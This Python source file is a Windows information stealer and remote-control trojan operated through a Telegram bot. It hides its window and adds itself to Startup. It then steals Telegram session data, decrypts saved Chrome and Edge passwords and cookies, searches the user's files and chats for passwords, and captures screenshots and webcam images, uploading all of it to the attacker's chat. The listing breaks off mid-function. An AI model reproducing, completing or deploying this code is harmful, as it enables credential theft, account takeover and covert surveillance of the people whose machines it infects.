import os
import sys
import shutil
import sqlite3
import socket
import platform
import getpass
import psutil
import base64
import requests
import json
import time
from datetime import datetime
from pathlib import Path
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
import threading
import re
import glob
import win32crypt
from telethon.sync import TelegramClient
from telethon.tl.functions.messages import GetDialogsRequest
from telethon.tl.types import InputPeerEmpty
import pyautogui
import cv2
import keyboard
from PIL import Image
import ctypes
import pythoncom
from pycaw.pycaw import AudioUtilities, ISimpleAudioVolume
import logging
import subprocess
import winsound
import tempfile
import msvcrt
import win32com.client
import win32clipboard
import win32api
import win32con
import zipfile

# === ЛОГИ ===
logging.basicConfig(
    filename=os.path.join(os.getenv('TEMP'), 'stealer_log.txt'),
    level=logging.DEBUG,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

update_lock = threading.Lock()
file_lock = threading.Lock()

class Stealer:
    def __init__(self):
        try:
            self.data_dir = os.path.join(os.getenv('TEMP'), 'stealer_data')
            os.makedirs(self.data_dir, exist_ok=True)
            self.lock_file = os.path.join(self.data_dir, 'bot.lock')
            self.devices_file = os.path.join(self.data_dir, 'devices.json')
            self.output_file = os.path.join(self.data_dir, 'collected_data.txt')
            self.pptx_file = os.path.join(self.data_dir, 'collected_data.pptx')
            self.fallback_file = os.path.join(self.data_dir, 'collected_data_fallback.txt')
            self.screenshot_file = os.path.join(self.data_dir, 'screenshot.png')
            self.webcam_file = os.path.join(self.data_dir, 'webcam.jpg')
            self.wallpaper_file = os.path.join(self.data_dir, 'new_wallpaper.jpg')
            self.original_wallpaper_file = os.path.join(self.data_dir, 'original_wallpaper.jpg')
            self.waiting_for_photo = False
            self.waiting_for_showimage = False
            self.bot_token = 'TOKEN_BOT'
            self.chat_id = 'YOU_CHAT_ID'
            self.telegram_text_api = f'https://api.telegram.org/bot{self.bot_token}/sendMessage'
            self.telegram_photo_api = f'https://api.telegram.org/bot{self.bot_token}/sendPhoto'
            self.telegram_file_api = f'https://api.telegram.org/bot{self.bot_token}/sendDocument'
            self.api_id = 123456
            self.api_hash = 'your_api_hash'
            self.session_file = os.path.join(self.data_dir, 'telegram_session')
            self.running = True
            self.keyboard_locked = False
            self.mouse_locked = False
            self.mouse_restrict_thread = None
            self.search_buffer = ""
            self.last_process = ""
            self.processes_per_page = 10
            self.mouse_circle_radius = 200
            self.temp_dir = os.path.join(self.data_dir, 'temp')
            os.makedirs(self.temp_dir, exist_ok=True)
            self.current_page = 0
            self.current_files = {}
            self.current_path = None
            self.all_files = []
            self.process_list = []
            self.device_id = socket.gethostname()

            # === АВТОЗАПУСК /steal ===
            threading.Thread(target=self.auto_steal_tdata, daemon=True).start()

            self.register_device()
            self.acquire_lock()
            self.clear_update_queue()
            self.hide_window()
            self.enable_autostart()
            self.send_commands_list()
            self.setup_hotkey()
            logging.info(f"Stealer initialized on device {self.device_id}")
        except Exception as e:
            logging.error(f"Error in Stealer.__init__: {str(e)}")
            self.send_telegram_message(f"Initialization error on {self.device_id}: {str(e)}")
            self.release_lock()

  
    def auto_steal_tdata(self):
        time.sleep(5)  # Ждём инициализацию
        try:
            self.send_telegram_message(f"🔥 Автозапуск: проверяю tdata на {self.device_id}...")
            self.steal_tdata()
        except Exception as e:
            logging.error(f"Auto steal failed: {e}")

    # === КОМАНДА /steal ===
    def steal_tdata(self):
        try:
            tgsession_dir = os.path.join(os.getenv('TEMP'), 'Windows_NB_TGsession')
            os.makedirs(tgsession_dir, exist_ok=True)

            telegram_paths = [
                os.path.join(os.getenv('APPDATA'), "Telegram Desktop", "tdata"),
                os.path.join(os.getenv('APPDATA'), "TelegramDesktop", "tdata"),
                os.path.join(os.getenv('APPDATA'), "AyuGram Desktop", "tdata"),
                os.path.join(os.getenv('APPDATA'), "AyuGramDesktop", "tdata"),
                os.path.join(os.getenv('APPDATA'), "AyuGram", "tdata"),
                os.path.join(os.path.expanduser("~"), "Desktop", "tdata"),
                os.path.join(os.path.expanduser("~"), "Downloads", "tdata"),
            ]

            found_any = False
            for i, src_dir in enumerate(telegram_paths):
                if not os.path.exists(src_dir):
                    continue

                path_folder = os.path.join(tgsession_dir, f"path_{i+1}")
                os.makedirs(path_folder, exist_ok=True)
                copied = False

                for item in os.listdir(src_dir):
                    src_path = os.path.join(src_dir, item)
                    dest_path = os.path.join(path_folder, item)
                    try:
                        if os.path.isfile(src_path) and item.endswith("s") and item not in ["countries", "settingss"]:
                            shutil.copy2(src_path, dest_path)
                            copied = True
                            folder_name = item[:-1]
                            folder_src = os.path.join(src_dir, folder_name)
                            if os.path.isdir(folder_src):
                                shutil.copytree(folder_src, os.path.join(path_folder, folder_name), dirs_exist_ok=True)
                    except: pass

                if copied:
                    found_any = True
                    self.send_telegram_message(f"✅ tdata найдена: путь {i+1}")

            if found_any:
                zip_name = f"tg_session_{self.device_id}.zip"
                zip_path = os.path.join(os.getenv('TEMP'), zip_name)
                with zipfile.ZipFile(zip_path, 'w') as zipf:
                    for root, _, files in os.walk(tgsession_dir):
                        for file in files:
                            file_path = os.path.join(root, file)
                            arcname = os.path.relpath(file_path, tgsession_dir)
                            zipf.write(file_path, arcname)

                with open(zip_path, 'rb') as f:
                    requests.post(
                        self.telegram_file_api,
                        data={'chat_id': self.chat_id},
                        files={'document': (zip_name, f)}
                    ).raise_for_status()

                shutil.rmtree(tgsession_dir)
                os.remove(zip_path)
                self.send_telegram_message(f"🔥 tdata украдена с {self.device_id}!")
            else:
                self.send_telegram_message(f"❌ tdata не найдена на {self.device_id}")

        except Exception as e:
            logging.error(f"Steal tdata error: {e}")
            self.send_telegram_message(f"Ошибка кражи tdata: {e}")

    def register_device(self):
        """Register this device in the devices.json file."""
        try:
            with file_lock:
                devices = self.load_devices()
                if self.device_id.lower() not in [d.lower() for d in devices['devices']]:
                    devices['devices'][self.device_id] = {'chat_id': self.chat_id, 'last_seen': str(datetime.now())}
                    self.save_devices(devices)
                    self.send_telegram_message(f"Device registered: {self.device_id}")
                    logging.info(f"Device registered: {self.device_id}")
        except Exception as e:
            logging.error(f"Error registering device {self.device_id}: {str(e)}")
            self.send_telegram_message(f"Error registering device {self.device_id}: {str(e)}")

    def load_devices(self):
        """Load devices and selected device from devices.json."""
        try:
            if os.path.exists(self.devices_file):
                with open(self.devices_file, 'r', encoding='utf-8') as f:
                    return json.load(f)
            return {'devices': {}, 'selected': {}}
        except Exception as e:
            logging.error(f"Error loading devices: {str(e)}")
            return {'devices': {}, 'selected': {}}

    def save_devices(self, devices):
        """Save devices and selected device to devices.json."""
        try:
            with open(self.devices_file, 'w', encoding='utf-8') as f:
                json.dump(devices, f, indent=2)
        except Exception as e:
            logging.error(f"Error saving devices: {str(e)}")

    def get_selected_device(self, chat_id):
        """Get the selected device for a given chat_id."""
        devices = self.load_devices()
        return devices['selected'].get(str(chat_id))

    def set_selected_device(self, chat_id, device_id):
        """Set the selected device for a given chat_id."""
        try:
            with file_lock:
                devices = self.load_devices()
                device_id_lower = device_id.lower()
                device_ids_lower = {d.lower(): d for d in devices['devices']}
                if device_id_lower in device_ids_lower:
                    devices['selected'][str(chat_id)] = device_ids_lower[device_id_lower]
                    self.save_devices(devices)
                    logging.info(f"Selected device {device_ids_lower[device_id_lower]} for chat_id {chat_id}")
                    return f"Selected device: {device_ids_lower[device_id_lower]}"
                return f"Device {device_id} not found. Use /listdevices to see available devices."
        except Exception as e:
            logging.error(f"Error setting selected device: {str(e)}")
            return f"Error selecting device: {str(e)}"

    def list_devices(self):
        """List all registered devices."""
        try:
            devices = self.load_devices()
            if not devices['devices']:
                return "No devices registered."
            device_list = [f"{device_id} (Last seen: {info['last_seen']})" for device_id, info in devices['devices'].items()]
            return "Registered devices:\n" + "\n".join(device_list)
        except Exception as e:
            logging.error(f"Error listing devices: {str(e)}")
            return f"Error listing devices: {str(e)}"

    def debug_devices(self):
        """Return the raw content of devices.json for debugging."""
        try:
            devices = self.load_devices()
            return f"devices.json content:\n{json.dumps(devices, indent=2)}"
        except Exception as e:
            logging.error(f"Error debugging devices: {str(e)}")
            return f"Error debugging devices: {str(e)}"

    def enable_autostart(self):
        """Add the script to the Windows Startup folder as a shortcut."""
        try:
            pythonw_path = shutil.which('pythonw.exe')
            script_path = os.path.abspath(sys.argv[0])
            is_exe = script_path.endswith('.exe')
            if not is_exe and not pythonw_path:
                logging.error("pythonw.exe not found. Cannot enable autostart for .py file.")
                self.send_telegram_message("Error: pythonw.exe not found. Cannot enable autostart for .py file.")
                return
            startup_folder = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
            shortcut_path = os.path.join(startup_folder, 'StealerBot.lnk')
            if os.path.exists(shortcut_path):
                logging.info(f"Autostart shortcut already exists at {shortcut_path}")
                self.send_telegram_message(f"Autostart shortcut already exists at {shortcut_path} on {self.device_id}")
                return
            shell = win32com.client.Dispatch('WScript.Shell')
            shortcut = shell.CreateShortCut(shortcut_path)
            if is_exe:
                shortcut.TargetPath = script_path
                shortcut.Arguments = ''
            else:
                shortcut.TargetPath = pythonw_path
                shortcut.Arguments = f'"{script_path}"'
            shortcut.WorkingDirectory = os.path.dirname(script_path)
            shortcut.Description = 'Stealer Bot Autostart'
            shortcut.save()
            logging.info(f"Created autostart shortcut at {shortcut_path}")
            self.send_telegram_message(f"Autostart enabled via Startup folder: {shortcut_path} on {self.device_id}")
        except Exception as e:
            logging.error(f"Error enabling autostart: {str(e)}")
            self.send_telegram_message(f"Error enabling autostart on {self.device_id}: {str(e)}")

    def disable_autostart(self):
        """Remove the script from the Windows Startup folder."""
        try:
            startup_folder = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
            shortcut_path = os.path.join(startup_folder, 'StealerBot.lnk')
            if os.path.exists(shortcut_path):
                os.remove(shortcut_path)
                logging.info(f"Removed autostart shortcut: {shortcut_path}")
                self.send_telegram_message(f"Autostart disabled on {self.device_id}: {shortcut_path}")
            else:
                logging.info("No autostart shortcut found")
                self.send_telegram_message(f"No autostart shortcut found on {self.device_id}")
        except Exception as e:
            logging.error(f"Error disabling autostart: {str(e)}")
            self.send_telegram_message(f"Error disabling autostart on {self.device_id}: {str(e)}")

    def acquire_lock(self):
        """Ensure only one instance of the bot is running using a lock file."""
        try:
            self.lock_fd = open(self.lock_file, 'w')
            msvcrt.locking(self.lock_fd.fileno(), msvcrt.LK_NBLCK, 1)
            logging.info("Acquired lock file")
        except (IOError, OSError) as e:
            logging.error("Another instance is already running")
            print("Another bot instance is running. Exiting.")
            sys.exit(1)

    def release_lock(self):
        """Release the lock file when the bot exits."""
        try:
            msvcrt.locking(self.lock_fd.fileno(), msvcrt.LK_UNLCK, 1)
            self.lock_fd.close()
            if os.path.exists(self.lock_file):
                os.remove(self.lock_file)
            logging.info("Released lock file")
        except Exception as e:
            logging.error(f"Error releasing lock: {str(e)}")

    def clear_update_queue(self):
        """Clear the Telegram update queue to prevent processing old messages."""
        try:
            offset = 0
            while True:
                with update_lock:
                    updates = requests.get(
                        f'https://api.telegram.org/bot{self.bot_token}/getUpdates',
                        params={'offset': offset, 'limit': 100, 'timeout': 0},
                        timeout=5
                    ).json()
                if not updates.get('ok'):
                    logging.error(f"Failed to clear update queue: {updates.get('description', 'Unknown error')}")
                    break
                if not updates.get('result'):
                    break
                offset = updates['result'][-1]['update_id'] + 1
            logging.info("Cleared Telegram update queue")
        except Exception as e:
            logging.error(f"Error clearing update queue: {str(e)}")
            self.send_telegram_message(f"Error clearing update queue: {str(e)}")

    def hide_window(self):
        """Hide the console window."""
        try:
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
            logging.info("Console window hidden")
        except Exception as e:
            logging.error(f"Error hiding window: {str(e)}")

    def send_commands_list(self):
        """Send the list of available commands to Telegram."""
        try:
            commands = [
                "/listdevices - List all registered devices.",
                "/selectdevice <device_id> - Select a device to control.",
                "/debugdevices - Show raw devices.json content for debugging.",
                "/disableautostart - Remove the script from Windows Startup.",
                "/screenshot - Takes and sends a screenshot.",
                "/webcam - Captures and sends a webcam image.",
                "/listprocesses - Lists active processes.",
                "/exitgame - Shows processes as a table with buttons to terminate.",
                "/lockkeyboard - Blocks keyboard input.",
                "/unlockkeyboard - Unblocks keyboard input.",
                "/lockmouse - Blocks mouse movement and clicks.",
                "/unlockmouse - Unblocks mouse movement and clicks.",
                "/sound - Plays a loud sound.",
                "/setvolume <value> - Sets volume (0-100, e.g., /setvolume 50).",
                "/offvolume - Mutes the volume.",
                "/onwifi - Enables WiFi.",
                "/offwifi - Disables WiFi.",
                "/turnhotkey <hotkey> - Triggers a hotkey (e.g., /turnhotkey Alt+F4).",
                "/imagepc - Sets desktop wallpaper (send a photo after this command).",
                "/imagereturn - Reverts to the original wallpaper.",
                "/showimage - Display a photo sent via Telegram on the device's screen.",
                "/restart - Restarts the system.",
                "/shutdown - Shuts down the system.",
                "/lockscreen - Locks the screen (Windows+L).",
                "/openurl <url> - Opens a URL in the default browser.",
                "/sendkeys <text> - Types text into the active window.",
                "/getclipboard - Gets the clipboard content.",
                "/setclipboard <text> - Sets the clipboard content.",
                "/listfiles <path> - Lists files in the specified directory.",
                "/downloadfile <path> - Downloads a file from the device via Telegram.",
                "/executecmd <command> - Executes a command in cmd.",
                "/monitor - Starts process and search monitoring.",
                "/mousecircle <sec> <speed> - 🖱️ Mouse circles (e.g., /mousecircle 5 100)",
                "/rickroll - 🎵 Plays Rick Roll video",
                "/cursorhide <sec> - 🖱️ Hides cursor (default 30s)",
                "/reversescreen - 🔄 Flips screen 180°",
                "/cmdflood <count> - 💥 Opens X CMD windows (default 20)",
                "/upload - 📤 Upload file from Telegram (send photo after)",
                "/passwordsteal - 🔑 Steals browser passwords",
                "/cookiesteal - 🍪 Steals browser cookies", 
                "/browserhistory - 🌐 Steals browser history",
                "/stop - Stops monitoring and exits."
            ]
            self.send_telegram_message(f"Bot started on {self.device_id}. Available commands:\n" + "\n".join(commands))
            logging.info("Sent commands list to Telegram")
        except Exception as e:
            logging.error(f"Error sending commands list: {str(e)}")
            self.send_telegram_message(f"Error sending commands list: {str(e)}")

    def setup_hotkey(self):
        """Set up a hotkey to stop the program."""
        try:
            keyboard.add_hotkey('ctrl+shift+f10', self.stop_program)
            logging.info("Hotkey Ctrl+Shift+F10 set up")
        except Exception as e:
            logging.error(f"Error setting up hotkey: {str(e)}")
            self.send_telegram_message(f"Error setting up hotkey: {str(e)}")

    def stop_program(self):
        """Stop the program via hotkey."""
        try:
            self.running = False
            self.mouse_locked = False
            self.keyboard_locked = False
            if self.mouse_restrict_thread:
                self.mouse_restrict_thread = None
            ctypes.windll.user32.BlockInput(False)
            self.send_telegram_message(f"Program stopped on {self.device_id} via Ctrl+Shift+F10.")
            logging.info("Program stopped via hotkey")
            self.release_lock()
            sys.exit(0)
        except Exception as e:
            logging.error(f"Error stopping program: {str(e)}")
            self.send_telegram_message(f"Error stopping program: {str(e)}")
            self.release_lock()

    def heartbeat(self):
        """Send periodic heartbeat messages to indicate the bot is running."""
        while self.running:
            try:
                self.send_telegram_message(f"Bot is running on {self.device_id} (heartbeat).")
                with file_lock:
                    devices = self.load_devices()
                    devices['devices'][self.device_id]['last_seen'] = str(datetime.now())
                    self.save_devices(devices)
                logging.info("Sent heartbeat message")
                time.sleep(60)
            except Exception as e:
                logging.error(f"Error in heartbeat: {str(e)}")
                time.sleep(60)

    def get_system_info(self):
        """Collect system information."""
        try:
            info = {}
            info['hostname'] = socket.gethostname()
            info['ip'] = socket.gethostbyname(socket.gethostname())
            info['os'] = platform.system() + ' ' + platform.release()
            info['username'] = getpass.getuser()
            info['cpu'] = platform.processor()
            info['ram'] = str(round(psutil.virtual_memory().total / (1024.0 ** 3))) + ' GB'
            logging.info("Collected system info")
            return info
        except Exception as e:
            logging.error(f"Error getting system info: {str(e)}")
            return {}

    def get_browser_paths(self):
        """Get paths to browser data directories."""
        try:
            browsers = {
                'Chrome': os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data'),
                'Edge': os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Edge', 'User Data')
            }
            return browsers
        except Exception as e:
            logging.error(f"Error getting browser paths: {str(e)}")
            return {}

    def decrypt_chrome_password(self, encrypted_password, key):
        """Decrypt Chrome/Edge passwords."""
        try:
            if encrypted_password.startswith(b'v10') or encrypted_password.startswith(b'v11'):
                iv = encrypted_password[3:15]
                payload = encrypted_password[15:]
                cipher = AES.new(key, AES.MODE_GCM, iv)
                decrypted_pass = unpad(cipher.decrypt(payload), 16)
                return decrypted_pass.decode()
            else:
                decrypted_pass = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1]
                return decrypted_pass.decode()
        except Exception as e:
            logging.error(f"Error decrypting Chrome password: {str(e)}")
            return ''

    def get_chrome_encryption_key(self):
        """Get the encryption key for Chrome/Edge passwords."""
        try:
            local_state_path = os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data', 'Local State')
            with open(local_state_path, 'r', encoding='utf-8') as f:
                local_state = json.load(f)
            key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
            key = key[5:]  # Remove 'DPAPI' prefix
            key = win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
            return key
        except Exception as e:
            logging.error(f"Error getting Chrome encryption key: {str(e)}")
            return None

    def filter_valid_data(self, data_list):
        """Filter valid data entries."""
        try:
            filtered = [item for item in data_list if item and len(item) > 3]
            return filtered
        except Exception as e:
            logging.error(f"Error filtering data: {str(e)}")
            return []

    def get_browser_passwords(self):
        """Collect browser passwords."""
        try:
            passwords = []
            browsers = self.get_browser_paths()
            for browser, path in browsers.items():
                if os.path.exists(path):
                    key = self.get_chrome_encryption_key()
                    if not key:
                        continue
                    profiles = ['Default'] + [f'Profile {i}' for i in range(1, 5)]
                    for profile in profiles:
                        login_data = os.path.join(path, profile, 'Login Data')
                        if os.path.exists(login_data):
                            temp_db = os.path.join(self.data_dir, f'{browser}_{profile}_Login_Data')
                            shutil.copy2(login_data, temp_db)
                            conn = sqlite3.connect(temp_db)
                            cursor = conn.cursor()
                            cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
                            for row in cursor.fetchall():
                                url, username, encrypted_password = row
                                password = self.decrypt_chrome_password(encrypted_password, key) if encrypted_password else ''
                                if username or password:
                                    passwords.append(f'{browser} | URL: {url} | User: {username} | Pass: {password}')
                            conn.close()
                            os.remove(temp_db)
            return self.filter_valid_data(passwords)
        except Exception as e:
            logging.error(f"Error getting browser passwords: {str(e)}")
            return []

    def get_browser_cookies(self):
        """Collect browser cookies."""
        try:
            cookies = []
            browsers = self.get_browser_paths()
            for browser, path in browsers.items():
                if os.path.exists(path):
                    profiles = ['Default'] + [f'Profile {i}' for i in range(1, 5)]
                    for profile in profiles:
                        cookie_data = os.path.join(path, profile, 'Cookies')
                        if os.path.exists(cookie_data):
                            temp_db = os.path.join(self.data_dir, f'{browser}_{profile}_Cookies')
                            shutil.copy2(cookie_data, temp_db)
                            conn = sqlite3.connect(temp_db)
                            cursor = conn.cursor()
                            cursor.execute('SELECT host_key, name, value, encrypted_value FROM cookies')
                            for row in cursor.fetchall():
                                host, name, value, encrypted_value = row
                                if encrypted_value:
                                    key = self.get_chrome_encryption_key()
                                    if key:
                                        value = self.decrypt_chrome_password(encrypted_value, key) or value
                                if host and name and value:
                                    cookies.append(f'{browser} | Host: {host} | Name: {name} | Value: {value}')
                            conn.close()
                            os.remove(temp_db)
            return self.filter_valid_data(cookies)
        except Exception as e:
            logging.error(f"Error getting browser cookies: {str(e)}")
            return []

    def get_browser_emails(self):
        """Collect email addresses from browser data."""
        try:
            emails = []
            browsers = self.get_browser_paths()
            for browser, path in browsers.items():
                if os.path.exists(path):
                    profiles = ['Default'] + [f'Profile {i}' for i in range(1, 5)]
                    for profile in profiles:
                        login_data = os.path.join(path, profile, 'Login Data')
                        if os.path.exists(login_data):
                            temp_db = os.path.join(self.data_dir, f'{browser}_{profile}_Login_Data')
                            shutil.copy2(login_data, temp_db)
                            conn = sqlite3.connect(temp_db)
                            cursor = conn.cursor()
                            cursor.execute('SELECT username_value FROM logins')
                            for row in cursor.fetchall():
                                email = row[0]
                                if email and re.match(r'[^@]+@[^@]+\.[^@]+', email):
                                    emails.append(f'{browser} | Email: {email}')
                            conn.close()
                            os.remove(temp_db)
            return self.filter_valid_data(emails)
        except Exception as e:
            logging.error(f"Error getting browser emails: {str(e)}")
            return []

    def search_files_for_passwords(self):
        """Search for passwords in files."""
        try:
            found_data = []
            search_paths = [
                os.path.join(os.getenv('USERPROFILE'), 'Desktop'),
                os.path.join(os.getenv('USERPROFILE'), 'Documents'),
                os.path.join(os.getenv('USERPROFILE'), 'Downloads')
            ]
            for path in search_paths:
                for ext in ['*.txt', '*.docx', '*.pdf']:
                    for file in glob.glob(os.path.join(path, ext)):
                        try:
                            with open(file, 'r', encoding='utf-8', errors='ignore') as f:
                                content = f.read()
                                passwords = re.findall(r'(?i)(?:password|pass|pwd|key):?\s*[\S]{6,}', content)
                                if passwords:
                                    found_data.append(f'File: {file} | Found: {"; ".join(passwords)}')
                        except:
                            pass
            return self.filter_valid_data(found_data)
        except Exception as e:
            logging.error(f"Error searching files for passwords: {str(e)}")
            return []

    def get_telegram_data(self):
        """Collect data from Telegram chats."""
        try:
            client = TelegramClient(self.session_file, self.api_id, self.api_hash)
            client.start()
            dialogs = client(GetDialogsRequest(
                offset_date=None,
                offset_id=0,
                offset_peer=InputPeerEmpty(),
                limit=100,
                hash=0
            )).to_dict()
            telegram_data = []
            for dialog in dialogs['dialogs']:
                try:
                    chat_id = dialog['peer']['user_id'] or dialog['peer']['chat_id'] or dialog['peer']['channel_id']
                    messages = client.get_messages(chat_id, limit=50)
                    for msg in messages:
                        if msg.message:
                            passwords = re.findall(r'(?i)(?:password|pass|pwd|key):?\s*[\S]{6,}', msg.message)
                            if passwords:
                                telegram_data.append(f'Telegram Chat {chat_id} | Found: {"; ".join(passwords)}')
                except:
                    pass
            client.disconnect()
            return self.filter_valid_data(telegram_data)
        except Exception as e:
            logging.error(f"Error getting Telegram data: {str(e)}")
            return []

    def get_telegram_session(self):
        """Collect Telegram session files."""
        try:
            session_files = []
            session_path = os.path.join(os.getenv('APPDATA'), 'Telegram Desktop', 'tdata')
            if os.path.exists(session_path):
                for file in glob.glob(os.path.join(session_path, '*')):
                    if os.path.isfile(file):
                        session_files.append(file)
            return session_files
        except Exception as e:
            logging.error(f"Error getting Telegram session files: {str(e)}")
            return []

    def create_pptx(self, passwords, cookies, emails, files_data, telegram_data, session_files):
        """Create a PowerPoint presentation with collected data."""
        try:
            if not PPTX_AVAILABLE:
                with open(self.fallback_file, 'w', encoding='utf-8') as f:
                    f.write(f'System Info ({self.device_id}):\n')
                    for k, v in self.get_system_info().items():
                        f.write(f'{k}: {v}\n')
                    f.write('\nPasswords:\n')
                    f.write('\n'.join(passwords) if passwords else 'No passwords found.\n')
                    f.write('\nCookies:\n')
                    f.write('\n'.join(cookies) if cookies else 'No cookies found.\n')
                    f.write('\nEmails:\n')
                    f.write('\n'.join(emails) if emails else 'No emails found.\n')
                    f.write('\nFile Data:\n')
                    f.write('\n'.join(files_data) if files_data else 'No file data found.\n')
                    f.write('\nTelegram Data:\n')
                    f.write('\n'.join(telegram_data) if telegram_data else 'No Telegram data found.\n')
                    f.write('\nTelegram Session Files:\n')
                    f.write('\n'.join(session_files) if session_files else 'No session files found.\n')
                logging.info(f"Created fallback file: {self.fallback_file}")
                return self.fallback_file
            prs = Presentation()
            slide_layout = prs.slide_layouts[1]
            slide = prs.slides.add_slide(slide_layout)
            title = slide.shapes.title
            title.text = f'Collected Data ({self.device_id})'
            content = slide.placeholders[1]
            content.text = f'System Info ({self.device_id}):\n'
            for k, v in self.get_system_info().items():
                content.text += f'{k}: {v}\n'
            content.text += '\nPasswords:\n'
            content.text += '\n'.join(passwords) if passwords else 'No passwords found.'
            content.text += '\n\nCookies:\n'
            content.text += '\n'.join(cookies) if cookies else 'No cookies found.'
            content.text += '\n\nEmails:\n'
            content.text += '\n'.join(emails) if emails else 'No emails found.'
            content.text += '\n\nFile Data:\n'
            content.text += '\n'.join(files_data) if files_data else 'No file data found.'
            content.text += '\n\nTelegram Data:\n'
            content.text += '\n'.join(telegram_data) if telegram_data else 'No Telegram data found.'
            content.text += '\n\nTelegram Session Files:\n'
            content.text += '\n'.join(session_files) if session_files else 'No session files found.'
            prs.save(self.pptx_file)
            logging.info(f"Created PPTX file: {self.pptx_file}")
            return self.pptx_file
        except Exception as e:
            logging.error(f"Error creating PPTX: {str(e)}")
            return self.fallback_file

    def take_screenshot(self):
        """Take and send a screenshot."""
        try:
            screenshot = pyautogui.screenshot()
            screenshot.save(self.screenshot_file)
            with open(self.screenshot_file, 'rb') as f:
                files = {'photo': (os.path.basename(self.screenshot_file), f)}
                payload = {'chat_id': self.chat_id}
                requests.post(self.telegram_photo_api, data=payload, files=files, timeout=5)
            logging.info("Screenshot taken and sent")
            return f"Screenshot taken and sent from {self.device_id}."
        except Exception as e:
            logging.error(f"Error taking screenshot: {str(e)}")
            return f"Error taking screenshot on {self.device_id}: {str(e)}"

    def exit_game(self, process_name=None):
        """Terminate a specified process."""
        try:
            if not process_name:
                return "Please specify a process name (e.g., chrome.exe)."
            terminated = False
            for proc in psutil.process_iter(['name']):
                if proc.info['name'].lower() == process_name.lower():
                    proc.terminate()
                    terminated = True
            if terminated:
                logging.info(f"Terminated all processes: {process_name}")
                return f"Terminated all processes on {self.device_id}: {process_name}"
            logging.warning(f"Process not found: {process_name}")
            return f"Process {process_name} not found on {self.device_id}."
        except Exception as e:
            logging.error(f"Error exiting process: {str(e)}")
            return f"Error exiting process on {self.device_id}: {str(e)}"

    def capture_webcam(self):
        """Capture and send a webcam image."""
        try:
            cap = cv2.VideoCapture(0)
            if not cap.isOpened():
                logging.warning("Webcam not found")
                return f"Webcam not found on {self.device_id}."
            ret, frame = cap.read()
            if ret:
                cv2.imwrite(self.webcam_file, frame)
                with open(self.webcam_file, 'rb') as f:
                    files = {'photo': (os.path.basename(self.webcam_file), f)}
                    payload = {'chat_id': self.chat_id}
                    requests.post(self.telegram_photo_api, data=payload, files=files, timeout=5)
                cap.release()
                logging.info("Webcam image captured and sent")
                return f"Webcam image captured and sent from {self.device_id}."
            cap.release()
            logging.warning("Failed to capture webcam image")
            return f"Failed to capture webcam image on {self.device_id}."
        except Exception as e:
            logging.error(f"Error capturing webcam: {str(e)}")
            return f"Error capturing webcam on {self.device_id}: {str(e)}"

    def list_processes(self):
        """List all running processes."""
        try:
            process_map = {
                'chrome.exe': 'Google Chrome',
                'msedge.exe': 'Microsoft Edge',
                'firefox.exe': 'Mozilla Firefox',
                'cs2.exe': 'Counter-Strike 2',
                'notepad.exe': 'Notepad',
                'explorer.exe': 'Windows Explorer',
                'taskmgr.exe': 'Task Manager',
                'cmd.exe': 'Command Prompt',
                'excel.exe': 'Microsoft Excel',
                'winword.exe': 'Microsoft Word',
                'powerpnt.exe': 'Microsoft PowerPoint',
                'outlook.exe': 'Microsoft Outlook',
                'steam.exe': 'Steam Client',
                'discord.exe': 'Discord',
                'spotify.exe': 'Spotify',
                'telegram.exe': 'Telegram',
                'avastsvc.exe': 'Avast Service',
                'adguard.exe': 'AdGuard',
                'onedrive.exe': 'OneDrive',
                'notepad++.exe': 'Notepad++',
                'system idle process': 'System Idle Process',
                'system': 'System',
                'registry': 'Registry',
                'smss.exe': 'Session Manager',
                'csrss.exe': 'Client Server Runtime',
                'wininit.exe': 'Windows Start-Up',
                'services.exe': 'Services',
                'lsass.exe': 'Local Security Authority',
                'winlogon.exe': 'Windows Logon',
                'dwm.exe': 'Desktop Window Manager',
                'fontdrvhost.exe': 'Font Driver Host',
                'svchost.exe': 'Service Host',
                'startmenuexperiencehost.exe': 'Start Menu',
                'shellexperiencehost.exe': 'Shell Experience',
                'searchapp.exe': 'Search App',
                'runtimebroker.exe': 'Runtime Broker',
                'applicationframehost.exe': 'Application Frame Host',
                'systemsettings.exe': 'System Settings'
            }
            processes = []
            seen = set()
            for proc in psutil.process_iter(['name', 'exe']):
                name = proc.info['name'].lower()
                if name not in seen:
                    seen.add(name)
                    friendly_name = process_map.get(name, name.capitalize())
                    processes.append({'name': proc.info['name'], 'friendly_name': friendly_name, 'exe': proc.info['exe'] or 'N/A'})
            logging.info(f"Listed {len(processes)} processes")
            return sorted(processes, key=lambda x: x['friendly_name'])
        except Exception as e:
            logging.error(f"Error listing processes: {str(e)}")
            return []

    def format_process_table(self, processes, page):
        """Format process list as a table for Telegram."""
        try:
            start_idx = page * self.processes_per_page
            end_idx = start_idx + self.processes_per_page
            page_processes = processes[start_idx:end_idx]
            if not page_processes:
                return f"No processes found on {self.device_id}.", []
            table = "```\n"
            table += f"{'ID':<4} {'Process Name':<30} {'Executable':<40}\n"
            table += "-" * 74 + "\n"
            buttons = []
            for idx, proc in enumerate(page_processes, start_idx + 1):
                table += f"{idx:<4} {proc['friendly_name'][:29]:<30} {proc['name'][:39]:<40}\n"
                buttons.append([{"text": f"Kill {proc['friendly_name']}", "callback_data": f"exitgame_{proc['name']}"}])
            table += "```"
            nav_buttons = []
            if page > 0:
                nav_buttons.append({"text": "Previous", "callback_data": f"page_{page-1}"})
            if end_idx < len(processes):
                nav_buttons.append({"text": "Next", "callback_data": f"page_{page+1}"})
            if nav_buttons:
                buttons.append(nav_buttons)
            message = f"Active Processes on {self.device_id} (Page {page + 1}):\n{table}\nSelect a process to terminate:"
            return message, buttons
        except Exception as e:
            logging.error(f"Error formatting process table: {str(e)}")
            return f"Error formatting process table on {self.device_id}: {str(e)}", []

    def send_process_buttons(self, page=0):
        """Send process list with interactive buttons."""
        try:
